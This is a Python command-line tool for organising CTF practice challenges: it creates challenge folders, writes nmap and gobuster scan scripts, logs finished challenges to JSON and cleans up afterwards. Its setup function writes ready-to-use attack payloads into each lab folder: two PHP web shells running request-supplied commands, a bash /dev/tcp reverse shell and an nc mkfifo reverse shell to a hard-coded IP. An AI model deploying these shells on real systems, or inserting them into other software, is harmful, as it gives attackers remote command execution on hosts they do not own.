#!/usr/bin/env python3
import argparse
import json
import os, shutil
import sys
from datetime import datetime
from pathlib import Path
from typing import Optional, Union


# Default values
script_dir = Path(os.path.expanduser("~")) / ".local" / "ctf-script"
CONFIG_FILE = script_dir / "ctf_challenges.json"
CTF_LISTS = script_dir / "list_of_ctf.json"


# Default challenges and categories
DEFAULT_CHALLENGES = ["HTB", "THM", "GPT", "DPSK", "PICO", "VHUB"]
DEFAULT_CATAGORIES = []
def_SUFFIX = "done"
def_PARENT_DIR = "ctfs"

# To check configuratin files exist or not
def check_config():
    # make sure that CONFIG_FILE exists
    if not script_dir.exists():
        script_dir.mkdir(parents=True, exist_ok=True)
    elif not CONFIG_FILE.exists():
        with CONFIG_FILE.open("w") as f:
            # Dump DEFAULT_CHALLENGES challenges for the key "challenges"
            json.dump({"challenges": DEFAULT_CHALLENGES}, f, indent=2)
            return DEFAULT_CHALLENGES
    else:
        with CONFIG_FILE.open("r") as f:
            data = json.load(f)
            return data.get("challenges")

def write_files(file_path, content):
    try:
        with open(file_path, "w") as f:
            f.write(content)
        print(f"[+] Created file: {file_path}")
    except PermissionError as e:
            print(f"[-] Permission denied to create {file}\n{e}")
    except Exception as e:
        print(f"[-] Something went wrong creating {file}\n{e}")
    
    return

# To create the scanning scripts and config files in script directory if not exists
def create_scripts(mode=None):
    gobuster_scan = script_dir / "gobuster-scan.sh"
    gobuster_vhub = script_dir / "gobuster-vhub.sh"
    nmap_scan = script_dir / "nmap-scan.sh"
    nmap_vhub = script_dir / "nmap-vhub.sh"
    
    list_of_files = [gobuster_scan, gobuster_vhub, nmap_scan, nmap_vhub]
    
    gobuster_scan_content = """#!/bin/bash\n\ngobuster dir -u http://$1 -w /opt/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,php.bak,bak -o root.gobuster"""
    gobuster_vhub_content = """#!/bin/bash\n\ngobuster dir -u http://$1 -w /opt/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,php.bak,bak,txt,zip -o root.gobuster"""
    nmap_scan_content = """#!/bin/bash\n\nnmap -sC -sV -v -oN nmap.txt $1"""
    nmap_vhub_content = """#!/bin/bash\n\nnmap -sC -sV -v --min-rate 5000 -oN nmap.txt $1"""
    
    list_of_contents = [gobuster_scan_content, gobuster_vhub_content, nmap_scan_content, nmap_vhub_content]
    
    # make sure that CONFIG_FILE exists
    if not script_dir.exists():
        script_dir.mkdir(parents=True, exist_ok=True)
    # go through each file and create if not exists
    for file, content in zip(list_of_files, list_of_contents):
        if not file.exists():
            write_files(file, content)
            try:
                os.chmod(file, 0o755)  # Make the script executable
            except Exception as e:
                print(f"[-] Could not set executable permission for {file}: {e}")
        else:
            if mode == "create":
                print(f"[=] Script {file} already exists.")
            continue
    return
    
    
# To clean up files in challenge directory after marking it done
def cleanup_challenge_files(challenge_dir: Union[str, Path]):
    """
    Removes all files with .php, .sh, or .gobuster extensions in the given directory and its subdirectories.
    This deletes the files from disk (permanently removes them).
    """
    challenge_dir = Path(challenge_dir)
    if not challenge_dir.is_dir():
        print(f"[-] {challenge_dir} is not a directory.")
        return
    extensions = {".php", ".sh", ".gobuster", ".py"}
    removed = 0
    removed_dirs = 0
    for file in sorted(challenge_dir.rglob("*"), reverse=True):
        if file.is_file() and file.suffix in extensions:
            try:
                file.unlink()  # This deletes the file from disk
                removed += 1
            except Exception as e:
                print(f"[-] Could not remove {file}: {e}")
        elif file.is_dir():
            choice = input(f"Remove {file} and everything inside it directory? (y/n): ").strip().lower()
            if choice == "n":
                print(f"[+] Directory {file} retained.")
            else:
                removed_dirs += 1

                try:
                    shutil.rmtree(file)  # This deletes the directory and its contents  
                except Exception as e:
                    print(f"[-] Could not remove {file}: {e}")
    print(f"[+] Removed {removed} files with extensions: {', '.join(extensions)} and {removed_dirs} directories.")
    
    
# To check if a challenge exists in done challenges json file and returns it's category
def find_challenge_and_category(challenge_name: str) -> Optional[str]:
    """
    Searches for the given challenge name in the CTF_LISTS JSON file.
    Returns the category (key) under which the challenge is found, or None if not found.
    """
    if not CTF_LISTS.exists():
        return None
    try:
        with CTF_LISTS.open("r") as f:
            data = json.load(f)
        ctfs = data.get("CTFS", {})
        for category, challenges in ctfs.items():
            if any(
                isinstance(entry, dict) and entry.get("name") == challenge_name
                for entry in challenges
            ):
                return category
    except Exception as e:
        print(f"[-] Couldn\'t look for {challenge_name}\n {e} ")
    return None

# To add new challenge category to a json file 
def add_challenge_to_json(json_file: Union[str, Path], challenge: str):
    """
    Adds the given challenge to the "challenges" key in the specified JSON file,
    if it does not already exist.
    """
    challenge = challenge.upper()
    json_file = Path(json_file)
    # Ensure the parent directory exists
    if not json_file.parent.exists():
        json_file.parent.mkdir(parents=True, exist_ok=True)
    # Load or initialize data
    if json_file.exists():
        with json_file.open("r") as f:
            try:
                data = json.load(f)
            except json.JSONDecodeError:
                data = {}
    else:
        data = {}
    # Ensure "challenges" key exists and is a list
    challenges = data.get("challenges", [])
    if not isinstance(challenges, list):
        challenges = []
    # Add challenge if not present
    if challenge not in challenges:
        challenges.append(challenge)
        data["challenges"] = challenges
        with json_file.open("w") as f:
            json.dump(data, f, indent=2)
        print(f"[+] Added challenge '{challenge}' to {json_file}")
    else:
        print(f"[=] Challenge '{challenge}' already exists in {json_file}")
    return

# To find the exact challenge path in deep directories
def find_named_ancestor(
    name: str, start: Optional[Union[str, Path]] = None
) -> Optional[Path]:
    name = name.rstrip("/\\ ").strip()
    if not name:
        return None

    start = Path(start or Path.cwd())
    if start.exists() and start.is_file():
        start = start.parent

    # Resolve if possible, but be tolerant if path doesn't exist
    try:
        start = start.resolve()
    except Exception:
        start = Path(start)

    matches = []
    for p in [start] + list(start.parents):
        if p.name == name:
            matches.append(p)

    if len(matches) == 0:
        return None
    if len(matches) > 1:
        print(
            f"[-] Directory named: {name} exists more than once in current path.\nPlease move a few directories back."
        )
        sys.exit(1)

    # exactly one match
    return matches[0]


# To save ctf challenges tried or done in a json file
def save_ctf(ctf_info, difficulty=None, **kwargs):
    """
    Save a CTF challenge entry with optional attributes.
    ctf_info: tuple/list (challenge_name, category)
    difficulty: optional string
    kwargs: any other attributes to save
    """
    try:
        # Ensure the directory exists
        if not script_dir.exists():
            script_dir.mkdir(parents=True, exist_ok=True)
        # Load existing data or initialize
        if CTF_LISTS.exists():
            with CTF_LISTS.open("r") as f:
                data = json.load(f)
        else:
            data = {}

        # Ensure top-level "CTFS" key exists
        if "CTFS" not in data:
            data["CTFS"] = {}

        # ctf_info should be a tuple or list: (challenge_name, category)
        if isinstance(ctf_info, (tuple, list)) and len(ctf_info) == 2:
            challenge, category = ctf_info
        else:
            print("[-] ctf_info must be a tuple/list: (challenge_name, category)")
            return

        # Ensure category key exists under "CTFS"
        if category not in data["CTFS"]:
            data["CTFS"][category] = []

        # Prepare challenge entry with attributes
        entry = {
            "name": challenge,
            # Always set current date and time, regardless of user input
            "date": datetime.now().strftime("%Y-%m-%d"),
            "time": datetime.now().strftime("%H:%M:%S"),
        }
        if difficulty:
            difficulty = difficulty[0].upper() + difficulty[1:]
            entry["difficulty"] = difficulty
        # Add any other attributes provided, but overwrite date/time with current
        kwargs.pop("date", None)
        kwargs.pop("time", None)
        entry.update(kwargs)

        # Ensure only dicts are present in the category list
        data["CTFS"][category] = [
            e for e in data["CTFS"][category] if isinstance(e, dict)
        ]

        # Only add if not already present (by name)
        if not any(e.get("name") == challenge for e in data["CTFS"][category]):
            data["CTFS"][category].append(entry)

        # Save back to file
        with CTF_LISTS.open("w") as f:
            json.dump(data, f, indent=4)
    except PermissionError as e:
        print(
            f"[-] Couldn't create or load the config file, error trying to save the ctf challenge\n{e}"
        )
    except Exception as e:
        print(f"Error {e}")

# To mark challenges Done
def mark_challenge_completed(
    target: Union[str, Path],
    suffix: str,
    challenge_type: str,
    difficulty: Optional[str] = None,
    other_attributes: Optional[str] = None
    ) -> None:
    """Resolve `target` (name or path). If `target` is a simple name (no separator),
    find the nearest ancestor with that name starting at cwd and rename it.
    If `target` is a path (absolute or contains separators) treat it as a path."""
    # Resolve input to a concrete Path
    if isinstance(target, Path):
        challenge_path = target.resolve()
    else:
        # target is a string
        if (os.sep in target) or (
            "/" in target
        ):  # contains a separator -> treat as a path
            challenge_path = Path(target).resolve()
        else:
            found = find_named_ancestor(target)
            if found is None:
                print(
                    f"[-] Directory named '{target}' not found among when trying to resolve in ({Path.cwd()})."
                )
                sys.exit(1)
            challenge_path = found

    # Basic checks
    if not challenge_path.exists():
        print(f"[-] Error trying to find '{challenge_path}'.")
        sys.exit(1)
    if not challenge_path.is_dir():
        print(f"[-] Path '{challenge_path}' is not a directory.")
        sys.exit(1)
    # To check if the challenge was marked done already
    if challenge_path.name.endswith(suffix):
        print(f"[-] Challenge '{challenge_path.name}' is already completed.")
        sys.exit(1)

    # New name to rename
    new_path = challenge_path.with_name(challenge_path.name + suffix)
    cleanup_challenge_files(challenge_path) # Call the function that cleans up files in the challenge directory
        
    # Save the challenge name to list_of_ctf.json file
    save_ctf(
        (target, challenge_type),
        difficulty=difficulty,
        other=other_attributes
        )
    
    # Rename
    try:
        challenge_path.rename(new_path)
    except OSError as e:
        print(f"Error renaming directory: \n{e}")
        sys.exit(1)


def challenge_exists(current_challenge_type, current_challenge):
    list_of_challenges = check_config()
    if current_challenge_type.upper() in list_of_challenges:
        print(f"[+] A {current_challenge_type} CTF Challenge")
        print(f"[+] Challenge Name : {current_challenge}")
        return True
    else:
        print(f"[-] Unknown challenge type {current_challenge_type}")
        exit(1)


# To Validate dirrectory structure
def validate_dirs(current_dir, parent_directory):
    if not parent_directory in current_dir:
        print(f"[-] Not in {parent_directory} directory")
        sys.exit(1)
    elif current_dir[-1] == parent_directory:
        print(f"User not doing any challenges\n Move into challenge directory")
        sys.exit(1)
    elif current_dir[-2] == parent_directory:
        print(
            f"[-] User not doing any challenges\n Move into challenge directory, Your'e in {current_dir[-1]}"
        )
        sys.exit(1)
        
    Parent_dir_index = current_dir.index(parent_directory)
    current_challenge_type = current_dir[Parent_dir_index + 1]

    if current_challenge_type != "pico":
        try:
            current_challenge = current_dir[Parent_dir_index + 2]
            return Parent_dir_index, current_challenge_type, current_challenge
            # challenge_exists(current_challenge_type, current_challenge)
        except Exception as e:
            print(f"[-] Something went wrong with the current directory:\n{e}")
            sys.exit(1)
    else:
        print("[-] Currently does not support pico challenges")
        sys.exit(1)    

# Function to initialize new challenge
def init_challenge(category4new_challenge, new_challenge_name):
    # The following are ctf starting files like php,sh,python rev shells and scanning scripts
            # Rev shells, You can modify them as per your need
    content_of_php_rev_shell = """<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>"""
    content_of_php_rev_short = """<?php system($_REQUEST['cmd']); ?>"""
    content_of_bash_rev_short = """/bin/bash -i >& /dev/tcp/port/9001 0>&1"""
    content_of_nc_mkfifio = """rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.105.231 9001 >/tmp/f"""
        # Scanning scripts
    gobuster_scan = script_dir / "gobuster-scan.sh"
    gobuster_vhub = script_dir / "gobuster-vhub.sh"
    nmap_scan = script_dir / "nmap-scan.sh"
    nmap_vhub = script_dir / "nmap-vhub.sh"
        
        
    base_dir = Path.home() / "challenges" / "ctfs"
    target_path = base_dir / category4new_challenge / new_challenge_name
    lab_path = target_path / "lab"
    
    if not (base_dir / category4new_challenge).is_dir():
        print(f"Existing directory '{category4new_challenge}' not found under ~/challenges/ctfs.\n You can provide other Base directory with -p flag")
        sys.exit(1)
    
    # Create the new challenge directory
    try:
        target_path.mkdir(parents=True, exist_ok=False)
        print(f"[+] Created directory: {target_path}")
        lab_path.mkdir(parents=True, exist_ok=False)
        #print(f"Created directory: {lab_path}")      
    except FileExistsError:
        print(f"Directory {target_path} already exists.")
        sys.exit(1)
    except PermissionError as e:
        print(f"Permission denied to create new file or directory\n{e}")
        sys.exit(1)
    notes_content = f"""
            ------ DATE : {datetime.now().strftime("%Y-%m-%d")} --------
               --- TIME : {datetime.now().strftime("%H:%M:%S")} ---
    
    Challenge Name      : {new_challenge_name.capitalize()}
    Challenge category  :  {category4new_challenge.capitalize()}
    """
    notes_file = target_path / f"notes-{new_challenge_name}.txt"
    php_web_short = lab_path / "shes.php"
    php_web = lab_path / "she-web.php"
    bash_rev = lab_path / "shes.sh"
    nc_fifo = lab_path / "nc-fifio.sh"
    notes_file.touch(exist_ok=True)
    
    # Call file writing function
    write_files(notes_file, notes_content)
    write_files(php_web_short, content_of_php_rev_short)
    write_files(php_web, content_of_php_rev_shell)
    write_files(bash_rev, content_of_bash_rev_short)
    write_files(nc_fifo, content_of_nc_mkfifio)
    
    # Copy scanning scripts to lab directory if they exist
    if category4new_challenge == "vhub":
        try:
            if not nmap_vhub.exists() or not gobuster_vhub.exists():
                print(f"[-] Scanning scripts not found in {script_dir}\n Please make sure you have nmap-vhub.sh and gobuster-vhub.sh scripts in {script_dir}\n Run with --create flag to create them")
                sys.exit(1)
            shutil.copy(nmap_vhub, target_path / "nmap-vhub.sh")
            shutil.copy(gobuster_vhub, target_path / "gobuster-vhub.sh")
        except Exception as e:
            print(f"[-] Something went wrong copying vhub scanning scripts to {target_path}\n {e}")
            sys.exit(1)
    else:
        try:
            if not nmap_scan.exists() or not gobuster_scan.exists():
                print(f"[-] Scanning scripts not found in {script_dir}\n Please make sure you have nmap-scan.sh and gobuster-scan.sh scripts in {script_dir}\n Run with --create flag to create them")
            shutil.copy(nmap_scan, target_path / "nmap-scan.sh")
            shutil.copy(gobuster_scan, target_path / "gobuster-scan.sh")
        except Exception as e:
            print(f"[-] Something went wrong copying scanning scripts to {target_path}\n {e}")

    return

# The main function that handles all the tasks smoothly
def main():
    parser = argparse.ArgumentParser(description="CMate: Manage CTF challenges with directory setup, tracking, and cleanup")
    parser.add_argument(
        "-s",
        "--suffix",
        default=def_SUFFIX,
        help=f"Suffix to add for completed challenges, Default is {def_SUFFIX}",
    )
    parser.add_argument(
        "-p",
        "--parent-dir",
        default=def_PARENT_DIR,
        help=f"Parent directory for CTF challenges, Default is {def_PARENT_DIR}/",
    )
    parser.add_argument(
        "-c", "--check", help="Check if challenge name exists in config file, provide challenge name "
    )
    parser.add_argument(
        "-d",
        "--difficulty",
        type=str,
        help="Enter the difficulty for the challenge (optional)",
    )
    parser.add_argument(
        "--create",
        action="store_true",
        help="Create scanning scripts in script directory if not exists",
    )
    parser.add_argument(
        "--other",
        type=str,
        nargs="+",
        help="Enter other attributes regarding the challenge, separated by commas",
    )
    parser.add_argument(
        "-i",
        "--init",
        type=str,
        nargs=2,
        metavar=("NAME", "CATEGORY"),
        help="To initialize a new challenge. provide challenge name and category < htb, thm, vhub ...>",
    )
    parser.add_argument("-a", "--add", type=str, help="Add a new challenge type")
    args = parser.parse_args()
    
    global SUFFIX, PARENT_DIR
    SUFFIX = "_" + args.suffix
    PARENT_DIR = args.parent_dir
    
    current_dir = Path.cwd()
    current_dir = current_dir.parts
    difficulty = args.difficulty if args.difficulty else None
    
    if args.create: # If user wants to create scanning scripts in script directory
        create_scripts(mode="create")
        sys.exit(0)
    
    if difficulty:
        difficulty_list = ["easy", "medium", "hard", "insane"]
        if difficulty.lower() not in difficulty_list:
            print(f"[-] Unknown difficulty level. Choose from {', '.join(difficulty_list)}.")
            sys.exit(1)
        
    Other_attributes = " ".join(args.other) if args.other else None 
    
    if args.check:
        found = find_challenge_and_category(args.check)
        if found:
            print(f"🗹 {args.check.capitalize()} : {found.capitalize()}")
            sys.exit(0)
        sys.exit(f"🆇  {args.check} Not Found")
    if args.add:
        new_challenge_category = args.add
        add_challenge_to_json(CONFIG_FILE, new_challenge_category ) # If user tries to add new challenges call add_challenge function
        sys.exit(0)
    if args.init:
        name, category = args.init
        #print(f"Challenge name: {name}")
        #print(f"Category: {category}")
        init_challenge(category, name)
        sys.exit(0)
    
    parent_dir_index, current_challenge_type, current_challenge = validate_dirs(
        current_dir, PARENT_DIR
    )
    
    if challenge_exists(current_challenge_type, current_challenge):
        mark_challenge_completed(
            current_challenge,
            SUFFIX,
            current_challenge_type,
            difficulty=difficulty,
            other_attributes=Other_attributes
            )


if __name__ == "__main__":
    main()
   
